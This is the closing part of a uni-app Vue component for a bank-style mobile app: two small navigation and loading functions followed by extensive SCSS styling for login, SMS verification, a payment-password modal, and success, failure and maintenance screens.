function handleMaintenanceRefresh() {
	showGlobalLoading('檢查系統狀態中...')
	setTimeout(() => {
		hideGlobalLoading()
		show.value = 1
		uni.showToast({ title: '請重新嘗試登錄', icon: 'none', duration: 2000 })
	}, 2000)
}

// ========== 返回首頁 ==========
function goHome() {
	uni.navigateBack({
		fail: () => {
			uni.switchTab({ url: '/pages/index/index' })
		}
	})
}
</script>

<style lang="scss" scoped>
.page-container {
	width: 100vw;
	min-height: 100vh;
}

// ========== 全局 Loading ==========
.global-loading-mask {
	position: fixed;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	background: #ffffff;
	display: flex;
	align-items: center;
	justify-content: center;
	z-index: 99999;
}

.global-loading-content {
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	text-align: center;
	padding: 60rpx;
}

.global-loading-logo {
	width: 200rpx;
	height: 200rpx;
	margin-bottom: 40rpx;
	border-radius: 20rpx;
}

.global-loading-text {
	font-size: 36rpx;
	color: #5f5f5f;
	font-weight: 500;
	margin-bottom: 60rpx;
	letter-spacing: 2rpx;
}

.global-loading-dots {
	display: flex;
	gap: 12rpx;
	align-items: center;
}

.dot {
	width: 12rpx;
	height: 12rpx;
	background-color: rgba(0, 0, 0, 0.8);
	border-radius: 50%;
	animation: dotPulse 1.4s ease-in-out infinite both;
}

.dot1 { animation-delay: -0.32s; }
.dot2 { animation-delay: -0.16s; }
.dot3 { animation-delay: 0s; }

@keyframes dotPulse {
	0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
	40% { transform: scale(1.2); opacity: 1; }
}

// ========== 登錄頁 ==========
.login-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	padding: 0 40rpx;
	position: relative;
}

.logo-section {
	display: flex;
	flex-direction: column;
	align-items: center;
	padding-top: 120rpx;
}

.bank-logo {
	width: 300rpx;
	height: 300rpx;
	margin-bottom: 30rpx;
}

.login-form {
	margin-bottom: 80rpx;
}

.input-group {
	margin-bottom: 40rpx;
}

.phone-input {
	display: flex;
	align-items: flex-start;
	background-color: #ffffff;
	border-radius: 50rpx;
	padding: 30rpx 40rpx;
	height: 100rpx;
	box-sizing: border-box;
	min-height: 100rpx;
}

.phone-prefix {
	display: flex;
	align-items: center;
	margin-right: 30rpx;
	flex-shrink: 0;
	height: 100%;
}

.user-icon { margin-right: 20rpx; color: #666; }

.country-code-wrapper {
	display: flex;
	align-items: center;
	gap: 8rpx;
	cursor: pointer;
}

.country-code {
	font-size: 32rpx;
	font-weight: 500;
	color: #333;
}

.phone-number {
	flex: 1;
	font-size: 32rpx;
	color: #333;
	border: none;
	background: transparent;
	height: 100%;
}

.password-input {
	display: flex;
	align-items: center;
	background-color: #ffffff;
	border-radius: 50rpx;
	padding: 30rpx 40rpx;
	height: 100rpx;
	box-sizing: border-box;
	min-height: 100rpx;
}

.lock-icon { margin-right: 30rpx; color: #666; }

.password-field {
	flex: 1;
	font-size: 32rpx;
	color: #333;
	border: none;
	background: transparent;
	height: 100%;
}

.checkbox-group {
	display: flex;
	align-items: center;
	margin: 40rpx 0 60rpx 0;
	cursor: pointer;
}

.custom-checkbox {
	width: 40rpx;
	height: 40rpx;
	border-radius: 50%;
	border: 2rpx solid #ddd;
	background-color: #fff;
	margin-right: 20rpx;
	display: flex;
	align-items: center;
	justify-content: center;
	transition: all 0.3s ease;
}

.custom-checkbox.checked {
	background-color: #007AFF;
	border-color: #007AFF;
	transform: scale(1.1);
}

.checkbox-label { font-size: 28rpx; color: #666; }

.login-btn {
	width: 100%;
	height: 100rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 50rpx;
	border: none;
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
	display: flex;
	align-items: center;
	justify-content: center;
	margin-bottom: 40rpx;
	box-shadow: 0 8rpx 20rpx rgba(255, 165, 0, 0.3);
}

.forgot-password {
	text-align: center;
	font-size: 28rpx;
	color: #007AFF;
	padding: 20rpx;
}

.switch-login-mode {
	position: absolute;
	display: flex;
	bottom: 60rpx;
	left: 50%;
	transform: translateX(-50%);
	font-size: 28rpx;
	color: #333;
	padding: 20rpx;
	cursor: pointer;

	.switch-login-mode-text { margin-right: 10rpx; }
}

// 區號弹窗
.modal-overlay {
	position: fixed;
	top: 0; left: 0; right: 0; bottom: 0;
	background-color: rgba(0, 0, 0, 0);
	z-index: 1000;
	display: flex;
	align-items: flex-end;
	transition: background-color 0.25s ease;
}

.modal-overlay.show { background-color: rgba(0, 0, 0, 0.5); }

.country-code-modal {
	width: 100%;
	background-color: #fff;
	border-radius: 20rpx 20rpx 0 0;
	max-height: 80vh;
	transform: translateY(100%);
	transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
}

.country-code-modal.show { transform: translateY(0); }

.modal-header {
	display: flex;
	align-items: center;
	justify-content: space-between;
	padding: 30rpx 40rpx;
	border-bottom: 1rpx solid #e5e5e5;
	position: relative;
}

.modal-cancel, .modal-confirm { font-size: 32rpx; color: #007AFF; padding: 10rpx; }

.modal-title {
	position: absolute;
	left: 50%;
	transform: translateX(-50%);
	font-size: 36rpx;
	font-weight: 600;
	color: #333;
}

.country-code-list { padding: 0 40rpx 40rpx; max-height: 60vh; overflow-y: auto; }

.country-code-item {
	display: flex;
	align-items: center;
	justify-content: space-between;
	padding: 30rpx;
	border-bottom: 1rpx solid #f0f0f0;
}

.country-code-item:last-child { border-bottom: none; }
.country-code-item.selected { background-color: #f8f9ff; }

.code-info { display: flex; flex-direction: column; }
.code-text { font-size: 36rpx; font-weight: 600; color: #333; margin-bottom: 8rpx; }
.code-name { font-size: 28rpx; color: #666; }

// ========== 驗證碼頁 ==========
.verify-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	padding: 0 40rpx;
	position: relative;
}

.status-bar { background-color: #f5f5f5; }

.header-section {
	display: flex;
	align-items: center;
	justify-content: center;
	padding: 40rpx 0 20rpx 0;
	position: relative;
}

.back-btn {
	position: absolute;
	left: 0;
	top: 50%;
	transform: translateY(-50%);
	padding: 10rpx;
	z-index: 10;
}

.header-title {
	font-size: 36rpx;
	font-weight: 600;
	color: #333;
	text-align: center;
}

.verify-logo-section {
	display: flex;
	flex-direction: column;
	align-items: center;
	padding: 60rpx 0;
}

.verify-bank-logo { width: 300rpx; height: 300rpx; margin-bottom: 20rpx; }

.info-section { text-align: center; margin-bottom: 80rpx; }
.info-title { font-size: 48rpx; font-weight: 600; color: #333; display: block; margin-bottom: 20rpx; }
.info-desc { font-size: 28rpx; color: #666; display: block; margin-bottom: 16rpx; }
.phone-number-display { font-size: 32rpx; color: #007AFF; font-weight: 500; display: block; }

.verify-section { margin-bottom: 80rpx; position: relative; }

.hidden-input {
	position: absolute;
	top: 0; left: 0;
	width: 100%; height: 100%;
	opacity: 0;
	font-size: 32rpx;
	border: none; outline: none;
	background: transparent;
	color: transparent;
	z-index: 10;
	pointer-events: auto;
}

.code-inputs {
	display: flex;
	justify-content: space-between;
	gap: 20rpx;
	margin-bottom: 60rpx;
	position: relative;
	z-index: 2;
	height: 80rpx;
}

.code-input {
	width: 80rpx; height: 80rpx;
	border: 2rpx solid #e5e5e5;
	border-radius: 12rpx;
	text-align: center;
	font-size: 36rpx;
	font-weight: 600;
	color: #333;
	background-color: #fff;
	transition: all 0.3s ease;
	display: flex;
	align-items: center;
	justify-content: center;
	position: relative;
}

.code-input.active { border-color: #007AFF; box-shadow: 0 0 0 2rpx rgba(0, 122, 255, 0.2); }
.code-input.filled { border-color: #007AFF; background-color: #f8f9ff; }

.code-input.cursor::after {
	content: '';
	position: absolute;
	top: 50%; left: 50%;
	transform: translate(-50%, -50%);
	width: 2rpx; height: 40rpx;
	background-color: #007AFF;
	animation: cursorBlink 1s infinite;
}

@keyframes cursorBlink {
	0%, 50% { opacity: 1; }
	51%, 100% { opacity: 0; }
}

.resend-section { text-align: center; }
.countdown-text { font-size: 28rpx; color: #999; }

.resend-btn {
	font-size: 28rpx;
	color: #007AFF;
	padding: 10rpx 20rpx;
	border-radius: 8rpx;
	background: rgba(0, 122, 255, 0.1);
	display: inline-block;
}

.submit-section { margin-bottom: 60rpx; }

.submit-btn {
	width: 100%;
	height: 100rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 50rpx;
	border: none;
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 8rpx 20rpx rgba(255, 165, 0, 0.3);
}

.submit-btn.disabled { background: #ccc; box-shadow: none; color: #999; }

.security-tips {
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 12rpx;
	padding: 20rpx;
}

.tips-text { font-size: 24rpx; color: #999; }

// ========== 收款服務頁 ==========
.payments-container {
	min-height: 100vh;
	background: #FFD700;
	position: relative;
}

.payments-header-section {
	position: sticky;
	top: 0;
	z-index: 1000;
	background: #FFD700;
}

.payments-status-bar { background: #FFD700; }

.payments-header-content {
	position: relative;
	padding: 60rpx 40rpx 40rpx;
	display: flex;
	align-items: center;
	justify-content: center;
}

.payments-header-bg {
	position: absolute;
	top: 0; left: 0; right: 0; bottom: 0;
	background: rgba(255, 255, 255, 0.15);
	backdrop-filter: blur(10rpx);
}

.payments-back-btn {
	position: absolute;
	left: 40rpx;
	top: 50%;
	transform: translateY(-50%);
	width: 60rpx; height: 60rpx;
	background: rgba(255, 255, 255, 0.25);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	z-index: 10;
}

.payments-header-title {
	font-size: 40rpx;
	font-weight: 700;
	color: #333;
	z-index: 5;
	position: relative;
}

.main-card {
	margin: 20rpx 30rpx 120rpx;
	background: #fff;
	border-radius: 32rpx;
	overflow: hidden;
}

.service-header {
	text-align: center;
	padding: 60rpx 40rpx 40rpx;
	background: linear-gradient(135deg, #f8faff 0%, #ffffff 100%);
	position: relative;
}

.service-header::before {
	content: '';
	position: absolute;
	top: 0; left: 0; right: 0;
	height: 6rpx;
	background: #FFD700;
}

.service-icon {
	width: 120rpx; height: 120rpx;
	background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	margin: 0 auto 30rpx;
}

.service-image { width: 120rpx; height: 120rpx; }
.service-title { font-size: 44rpx; font-weight: 700; color: #333; display: block; margin-bottom: 16rpx; }
.service-subtitle { font-size: 28rpx; color: #666; display: block; }

.description-section { padding: 40rpx; }

.description-card {
	display: flex;
	align-items: flex-start;
	padding: 30rpx;
	background: linear-gradient(135deg, #fffaf0 0%, #fff8dc 100%);
	border-radius: 20rpx;
	border-left: 6rpx solid #FFD700;
}

.description-icon { margin-right: 24rpx; margin-top: 4rpx; }
.description-content { flex: 1; }
.description-title { font-size: 32rpx; font-weight: 600; color: #333; display: block; margin-bottom: 12rpx; }
.description-text { font-size: 28rpx; color: #666; line-height: 1.6; display: block; }

.features-section { padding: 0 40rpx 40rpx; }
.section-title { font-size: 36rpx; font-weight: 600; color: #333; display: block; margin-bottom: 30rpx; text-align: center; }

.features-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20rpx; }

.feature-item {
	display: flex;
	flex-direction: column;
	align-items: center;
	padding: 30rpx 20rpx;
	background: #fff;
	border-radius: 16rpx;
	border: 2rpx solid #f0f0f0;
}

.feature-icon {
	width: 64rpx; height: 64rpx;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	margin-bottom: 16rpx;
}

.gradient-blue { background: linear-gradient(135deg, #007AFF 0%, #0056CC 100%); }
.gradient-green { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); }
.gradient-orange { background: linear-gradient(135deg, #FF6B35 0%, #F7931E 100%); }
.gradient-purple { background: linear-gradient(135deg, #6f42c1 0%, #e83e8c 100%); }

.feature-text { font-size: 26rpx; color: #333; font-weight: 500; text-align: center; }

.payments-security-tips {
	margin: 0 40rpx calc(180rpx + env(safe-area-inset-bottom));
	padding: 30rpx;
	background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
	border-radius: 16rpx;
	border: 2rpx solid #e9ecef;
}

.payments-tips-header { display: flex; align-items: center; margin-bottom: 24rpx; }
.payments-tips-title { font-size: 32rpx; font-weight: 600; color: #333; margin-left: 12rpx; }

.payments-tips-list { margin-left: 0; }

.tip-item { display: flex; align-items: flex-start; margin-bottom: 16rpx; }
.tip-item:last-child { margin-bottom: 0; }
.tip-dot { width: 8rpx; height: 8rpx; background: #FF8C00; border-radius: 50%; margin-right: 16rpx; margin-top: 12rpx; flex-shrink: 0; }
.tip-text { font-size: 26rpx; color: #666; line-height: 1.5; flex: 1; }

.bottom-actions {
	position: fixed;
	bottom: 0; left: 0; right: 0;
	padding: 30rpx 30rpx 40rpx;
	background: rgba(255, 255, 255, 0.95);
	backdrop-filter: blur(10rpx);
	z-index: 100;
}

.action-buttons { display: flex; gap: 20rpx; }

.btn-cancel {
	flex: 1;
	height: 88rpx;
	background: #f8f9fa;
	border: 2rpx solid #dee2e6;
	border-radius: 44rpx;
	font-size: 28rpx;
	color: #666;
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 8rpx;
}

.btn-activate {
	flex: 2;
	height: 88rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border: none;
	border-radius: 44rpx;
	font-size: 32rpx;
	font-weight: 700;
	color: #333;
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 8rpx;
	box-shadow: 0 8rpx 24rpx rgba(255, 165, 0, 0.3);
}

// 支付密碼彈窗
.password-modal {
	position: fixed;
	top: 0; left: 0; right: 0; bottom: 0;
	background: rgba(0, 0, 0, 0.6);
	display: flex;
	align-items: center;
	justify-content: center;
	z-index: 9999;
	padding: 40rpx;
}

.pwd-modal-wrapper { position: relative; width: 100%; max-width: 640rpx; }

.pwd-modal-container {
	background: #fff;
	border-radius: 32rpx;
	overflow: hidden;
	box-shadow: 0 32rpx 80rpx rgba(0, 0, 0, 0.2);
}

.pwd-modal-header {
	text-align: center;
	padding: 60rpx 40rpx 40rpx;
	background: linear-gradient(135deg, #f8faff 0%, #ffffff 100%);
}

.pwd-modal-icon {
	width: 100rpx; height: 100rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	margin: 0 auto 30rpx;
}

.pwd-modal-title { font-size: 40rpx; font-weight: 700; color: #333; display: block; margin-bottom: 16rpx; }
.pwd-modal-subtitle { font-size: 28rpx; color: #666; display: block; }

.pwd-password-section { padding: 40rpx; position: relative; }

.hidden-password-input {
	position: absolute;
	top: 0; left: 0;
	width: 100%; height: 100%;
	opacity: 0;
	z-index: 10;
	font-size: 32rpx;
	border: none; outline: none;
	background: transparent;
	color: transparent;
	pointer-events: auto;
}

.password-display {
	display: flex;
	justify-content: center;
	gap: 24rpx;
	position: relative;
	z-index: 5;
}

.password-circle {
	width: 80rpx; height: 80rpx;
	border: 3rpx solid #e5e5e5;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	background: #fff;
	transition: all 0.3s ease;
	position: relative;
}

.password-circle.filled { border-color: #FFD700; background: linear-gradient(135deg, #fffaf0 0%, #fff8dc 100%); }
.password-circle.active { border-color: #FFD700; box-shadow: 0 0 0 4rpx rgba(255, 215, 0, 0.3); }
.password-circle.animate { animation: passwordFill 0.3s ease; }

.password-dot { font-size: 32rpx; color: #FF8C00; font-weight: bold; }
.cursor-line { width: 3rpx; height: 40rpx; background: #FFD700; animation: cursorBlink 1s infinite; }

@keyframes passwordFill {
	0% { transform: scale(1); }
	50% { transform: scale(1.1); }
	100% { transform: scale(1); }
}

.pwd-modal-actions { display: flex; border-top: 1rpx solid #f0f0f0; }

.pwd-modal-btn {
	flex: 1;
	height: 100rpx;
	border: none;
	font-size: 32rpx;
	font-weight: 600;
	display: flex;
	align-items: center;
	justify-content: center;
}

.pwd-modal-btn-cancel { background: #f8f9fa; color: #666; border-right: 1rpx solid #f0f0f0; }
.pwd-modal-btn-confirm { background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #333; font-weight: 700; }
.pwd-modal-btn-confirm.disabled { background: #ccc; color: #999; }

.pwd-modal-close-btn {
	position: absolute;
	top: -80rpx; right: 0;
	width: 64rpx; height: 64rpx;
	background: rgba(255, 255, 255, 0.2);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
}

// ========== 成功頁 ==========
.success-container {
	min-height: 100vh;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	display: flex;
	flex-direction: column;
	position: relative;
	overflow: hidden;
}

.success-status-bar { background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); flex-shrink: 0; }

.success-content-wrapper {
	flex: 1;
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
}

.success-animation { position: relative; margin-bottom: 80rpx; }

.success-circle {
	width: 200rpx; height: 200rpx;
	position: relative;
	opacity: 0;
	transform: scale(0);
	transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

.success-circle.scale-in { opacity: 1; transform: scale(1); }

.success-ring {
	position: absolute;
	top: 0; left: 0;
	width: 100%; height: 100%;
	border: 8rpx solid rgba(255, 255, 255, 0.3);
	border-radius: 50%;
	animation: pulse 2s ease-in-out infinite;
}

.success-icon {
	position: absolute;
	top: 50%; left: 50%;
	width: 160rpx; height: 160rpx;
	background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 12rpx 40rpx rgba(40, 167, 69, 0.4);
	transform: translate(-50%, -50%) scale(0);
	transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

.success-icon.bounce-in { transform: translate(-50%, -50%) scale(1); }

.particles { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }

.particle {
	position: absolute;
	width: 12rpx; height: 12rpx;
	background: #fff;
	border-radius: 50%;
	opacity: 0;
	transform: translate(0, 0) scale(0);
}

.particle.float { animation: particleFloat 1.5s ease-out forwards; }

.success-content {
	text-align: center;
	max-width: 600rpx;
	width: 100%;
	opacity: 0;
	transform: translateY(60rpx);
	transition: all 0.8s ease;
}

.success-content.slide-up { opacity: 1; transform: translateY(0); }

.success-title-text { font-size: 56rpx; font-weight: 700; color: #333; display: block; margin-bottom: 16rpx; }
.success-subtitle { font-size: 32rpx; color: #666; display: block; margin-bottom: 60rpx; }

.service-info-card {
	background: rgba(255, 255, 255, 0.95);
	border-radius: 24rpx;
	padding: 40rpx 30rpx;
	margin-bottom: 60rpx;
	box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.1);
	opacity: 0;
	transform: translateY(40rpx);
	transition: all 0.6s ease;
}

.service-info-card.fade-in { opacity: 1; transform: translateY(0); }

.info-item { display: flex; align-items: center; margin-bottom: 30rpx; }
.info-item:last-child { margin-bottom: 0; }
.info-icon { margin-right: 24rpx; }
.info-content { flex: 1; text-align: left; }
.info-title { font-size: 30rpx; font-weight: 600; color: #333; display: block; margin-bottom: 8rpx; }
.info-desc { font-size: 26rpx; color: #666; display: block; }

.features-highlight { margin-bottom: 80rpx; }
.features-title-text { font-size: 32rpx; font-weight: 600; color: #333; display: block; margin-bottom: 30rpx; }

.features-list { display: flex; flex-wrap: wrap; gap: 16rpx; justify-content: center; }

.feature-badge {
	display: flex;
	align-items: center;
	gap: 12rpx;
	background: rgba(255, 255, 255, 0.9);
	border-radius: 50rpx;
	padding: 16rpx 24rpx;
	box-shadow: 0 4rpx 16rpx rgba(0, 0, 0, 0.1);
	opacity: 0;
	transform: translateX(-30rpx);
	transition: all 0.6s ease;
}

.feature-badge.slide-left { opacity: 1; transform: translateX(0); }
.feature-badge-text { font-size: 26rpx; color: #333; font-weight: 500; }

.success-action-section {
	width: 100%;
	max-width: 600rpx;
	margin-bottom: 100rpx;
	opacity: 0;
	transform: translateY(40rpx);
	transition: all 0.6s ease;
}

.success-action-section.slide-up { opacity: 1; transform: translateY(0); }
.success-action-buttons { display: flex; gap: 20rpx; }

.success-btn-primary {
	flex: 2;
	height: 88rpx;
	background: rgba(255, 255, 255, 0.95);
	border: none;
	border-radius: 44rpx;
	font-size: 32rpx;
	font-weight: 700;
	color: #333;
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 8rpx;
	box-shadow: 0 8rpx 24rpx rgba(0, 0, 0, 0.15);
}

@keyframes pulse {
	0% { transform: scale(1); opacity: 1; }
	50% { transform: scale(1.05); opacity: 0.7; }
	100% { transform: scale(1); opacity: 1; }
}

@keyframes particleFloat {
	0% { opacity: 0; transform: rotate(var(--angle)) translate(0, 0) scale(0); }
	20% { opacity: 1; transform: rotate(var(--angle)) translate(60rpx, 0) scale(1); }
	100% { opacity: 0; transform: rotate(var(--angle)) translate(120rpx, 0) scale(0); }
}

// ========== 失敗頁 ==========
.failure-container {
	min-height: 100vh;
	background: linear-gradient(135deg, #F5F5F5 0%, #FFF5F5 100%);
	padding: 40rpx 32rpx 32rpx;
	position: relative;
	overflow: hidden;
}

.failure-status-bar { display: flex; justify-content: center; margin-bottom: 60rpx; }

.failure-status-icon-wrapper {
	position: relative;
	&.animate-shake { animation: shake 0.8s ease-in-out infinite; }
}

.failure-status-icon { font-size: 120rpx; display: flex; align-items: center; justify-content: center; }

.failure-main-content {
	opacity: 0;
	transform: translateY(40rpx);
	transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
	&.content-fade-in { opacity: 1; transform: translateY(0); }
}

.failure-title { font-size: 48rpx; font-weight: 600; color: #333; text-align: center; margin-bottom: 24rpx; }
.failure-message { font-size: 32rpx; color: #666; text-align: center; line-height: 1.6; margin-bottom: 60rpx; padding: 0 20rpx; }

.failure-reasons-section, .failure-suggestions-section { margin-bottom: 48rpx; }

.failure-section-title {
	font-size: 36rpx;
	font-weight: 600;
	color: #333;
	margin-bottom: 32rpx;
	padding-left: 16rpx;
	position: relative;

	&::before {
		content: '';
		position: absolute;
		left: 0;
		top: 50%;
		transform: translateY(-50%);
		width: 8rpx;
		height: 32rpx;
		background: linear-gradient(45deg, #DC143C, #B91C3C);
		border-radius: 4rpx;
	}
}

.failure-reasons-list, .failure-suggestions-list {
	background: rgba(255, 255, 255, 0.8);
	border-radius: 16rpx;
	padding: 32rpx 24rpx;
	box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.1);
}

.failure-reason-item {
	display: flex;
	align-items: flex-start;
	margin-bottom: 24rpx;
	opacity: 0;
	transform: translateX(-30rpx);
	transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
	&:last-child { margin-bottom: 0; }
	&.item-slide-in { opacity: 1; transform: translateX(0); }
}

.failure-reason-dot { width: 12rpx; height: 12rpx; background: #DC143C; border-radius: 50%; margin-top: 16rpx; margin-right: 20rpx; flex-shrink: 0; }
.failure-reason-text { font-size: 30rpx; color: #555; line-height: 1.5; flex: 1; }

.failure-suggestion-item {
	display: flex;
	align-items: center;
	margin-bottom: 24rpx;
	opacity: 0;
	transform: translateX(-30rpx);
	transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
	&:last-child { margin-bottom: 0; }
	&.item-slide-in { opacity: 1; transform: translateX(0); }
}

.failure-suggestion-number {
	width: 40rpx; height: 40rpx;
	background: linear-gradient(45deg, #DC143C, #B91C3C);
	color: white;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 24rpx;
	font-weight: 600;
	margin-right: 20rpx;
	flex-shrink: 0;
}

.failure-suggestion-text { font-size: 30rpx; color: #555; line-height: 1.5; flex: 1; }

.failure-action-buttons {
	position: fixed;
	bottom: 0; left: 0; right: 0;
	padding: 32rpx;
	background: rgba(255, 255, 255, 0.95);
	backdrop-filter: blur(20rpx);
	border-top: 2rpx solid rgba(0, 0, 0, 0.05);
	transform: translateY(100%);
	transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
	&.buttons-slide-up { transform: translateY(0); }
}

.failure-home-button {
	width: 100%;
	height: 88rpx;
	border-radius: 44rpx;
	font-size: 32rpx;
	font-weight: 600;
	border: none;
	background: rgba(255, 255, 255, 0.9);
	color: #666;
	border: 2rpx solid rgba(0, 0, 0, 0.1);
}

@keyframes shake {
	0%, 100% { transform: translateX(0); }
	25% { transform: translateX(-5rpx); }
	75% { transform: translateX(5rpx); }
}

// ========== 維護頁 ==========
.maintenance-container {
	min-height: 100vh;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	padding: 80rpx 40rpx 60rpx;
	position: relative;
	overflow: hidden;
}

.maintenance-nav-header {
	position: absolute;
	top: 0; left: 0; right: 0;
	display: flex;
	justify-content: space-between;
	align-items: center;
	padding: 80rpx 30rpx 20rpx;
	z-index: 10;
}

.maintenance-nav-left, .maintenance-nav-right { display: flex; align-items: center; }

.maintenance-nav-btn {
	display: flex;
	align-items: center;
	gap: 8rpx;
	padding: 12rpx 20rpx;
	border: none;
	border-radius: 50rpx;
	font-size: 32rpx;
	color: #333;
	font-weight: 500;
	backdrop-filter: blur(10rpx);
}

.maintenance-nav-text { font-size: 32rpx; color: #333; font-weight: 500; }

.maintenance-animation { text-align: center; margin-bottom: 60rpx; }

.maintenance-image {
	width: 400rpx; height: 350rpx;
	opacity: 0;
	transform: translateY(40rpx);
	transition: all 0.8s ease;
	&.show { opacity: 1; transform: translateY(0); }
}

.maintenance-content {
	text-align: center;
	max-width: 500rpx;
	width: 100%;
	margin-bottom: 60rpx;
	opacity: 0;
	transform: translateY(40rpx);
	transition: all 0.6s ease;
	&.slide-up { opacity: 1; transform: translateY(0); }
}

.maintenance-title { font-size: 48rpx; font-weight: 700; color: #333; display: block; margin-bottom: 16rpx; }
.maintenance-subtitle { font-size: 28rpx; color: #666; display: block; margin-bottom: 40rpx; }

.maintenance-info-card {
	background: rgba(255, 255, 255, 0.9);
	border-radius: 20rpx;
	padding: 30rpx;
	margin-bottom: 40rpx;
	opacity: 0;
	transform: translateY(30rpx);
	transition: all 0.6s ease;
	&.fade-in { opacity: 1; transform: translateY(0); }
}

.maint-info-item { display: flex; align-items: center; margin-bottom: 24rpx; }
.maint-info-item:last-child { margin-bottom: 0; }
.maint-info-icon { margin-right: 20rpx; width: 50rpx; display: flex; justify-content: center; }
.maint-info-content { flex: 1; text-align: left; }
.maint-info-title { font-size: 28rpx; font-weight: 600; color: #333; display: block; margin-bottom: 4rpx; }
.maint-info-desc { font-size: 24rpx; color: #666; display: block; }

.maintenance-action-section {
	width: 100%;
	max-width: 500rpx;
	margin-bottom: 60rpx;
	opacity: 0;
	transform: translateY(30rpx);
	transition: all 0.6s ease;
	&.slide-up { opacity: 1; transform: translateY(0); }
}

.maintenance-tips {
	background: rgba(255, 255, 255, 0.8);
	border-radius: 16rpx;
	padding: 24rpx;
	margin-bottom: 30rpx;
}

.maintenance-tips-title { font-size: 28rpx; font-weight: 600; color: #333; display: block; margin-bottom: 16rpx; }
.maintenance-tips-list { display: flex; flex-direction: column; gap: 12rpx; }
.maint-tip-item { display: flex; align-items: center; gap: 12rpx; font-size: 24rpx; color: #666; }

.maintenance-btn-primary {
	width: 100%;
	height: 80rpx;
	background: rgba(255, 255, 255, 0.95);
	border: none;
	border-radius: 40rpx;
	font-size: 30rpx;
	font-weight: 700;
	color: #333;
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 8rpx;
}

.maintenance-status-section {
	position: absolute;
	bottom: 40rpx;
	left: 50%;
	transform: translateX(-50%);
	opacity: 0;
	transition: opacity 0.5s ease;
	&.fade-in { opacity: 1; }
}

.maintenance-status-item {
	display: flex;
	align-items: center;
	gap: 12rpx;
	padding: 16rpx 24rpx;
	background: rgba(255, 255, 255, 0.2);
	border-radius: 50rpx;
}

.maintenance-status-dot {
	width: 12rpx; height: 12rpx;
	background: #FF8C00;
	border-radius: 50%;
	animation: statusBlink 2s ease-in-out infinite;
}

.maintenance-status-text { font-size: 24rpx; color: #666; font-weight: 500; }

@keyframes statusBlink {
	0%, 100% { opacity: 1; }
	50% { opacity: 0.3; }
}
</style>
